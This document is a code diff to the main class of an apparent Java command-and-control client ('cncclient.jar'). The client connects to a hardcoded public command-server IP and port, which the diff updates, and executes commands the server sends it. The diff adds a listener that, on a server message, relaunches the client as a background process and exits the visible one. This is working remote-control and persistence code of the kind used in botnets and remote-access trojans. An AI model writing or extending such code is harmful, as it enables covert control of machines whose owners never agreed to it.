@@ -36,8 +36,8 @@ public class Main {
     public static final int OBJECTBUFFER = 50 * 1024;
 
     //The COMMANDIP and COMMANDPORT designate the public, forward-facing ipv4 address and port of the CNCCommandModule server.
-    private static final String COMMANDIP = "178.128.228.52";
-    private static final int COMMANDPORT = 80;
+    private static final String COMMANDIP = "178.128.231.167";
+    private static final int COMMANDPORT = 83;
 
     static Client client;
     //AuthenticationStatusLock prevents keepalive transmissions from the command from changing the authentication status to true, in the event of a manual reconnection request!
@@ -45,7 +45,7 @@ public class Main {
     private static boolean authenticated = false;
 
     //List of classes to be registered with kryo for (de)serialization
-    public static final List<Class> KRYO_CLASSES = Arrays.asList(byte[].class,PublicKeyTransmission.class, KeyRequest.class, ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class);
+    public static final List<Class> KRYO_CLASSES = Arrays.asList(BackgroundInitializer.class,byte[].class,PublicKeyTransmission.class, KeyRequest.class, ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class);
 
 
     //TODO More substantial way to block unsafe commands
@@ -98,7 +98,7 @@ public class Main {
 
         } catch (Exception e) {
             e.printStackTrace();
-            error("Unable to connect to command");
+            error("Unable to connect to  command");
             System.exit(0);
         }
         pseudoSecurelyObtainPublicKey();
@@ -165,6 +165,50 @@ public class Main {
             }
         });
     }
+    private static void startBackgroundInitializerListener() {
+        client.addListener(new Listener() {
+            public void received(Connection connection, Object object) {
+
+                if (object instanceof BackgroundInitializer) {
+                    BackgroundInitializer bgI = (BackgroundInitializer) object;
+                    try {
+                        if (!bgI.verify()) {
+                            error("Invalid authenticity");
+                            return;
+
+                        } else {
+                            log("Authenticity of BGI validated");
+
+                            //Start running
+                            log("Killing non-background process and starting as background");
+                            Runtime.getRuntime().exec("java -jar cncclient.jar &");
+                            log("Successfully started new instance, exiting");
+                            System.exit(0);
+
+
+
+
+
+
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        error("Unable to verify the authenticity of BackgroundInitializer from server");
+                    }
+
+
+                }
+
+
+            }
+        });
+
+
+
+
+
+    }
+
 
     /*
     Listens for commands sent from the command server and attempts to execute them, returns a CommandResponse!
@@ -217,6 +261,9 @@ public class Main {
                         client.sendTCP(new CommandResponse(e.getMessage()));
 
                     }
+
+
+                } else if (object instanceof BackgroundInitializer) {
 
 
                 }
@@ -278,6 +325,7 @@ public class Main {
         startCommandListener();
         startKillListener();
         startReconnectRequestListener();
+        startBackgroundInitializerListener();
 
     }
 
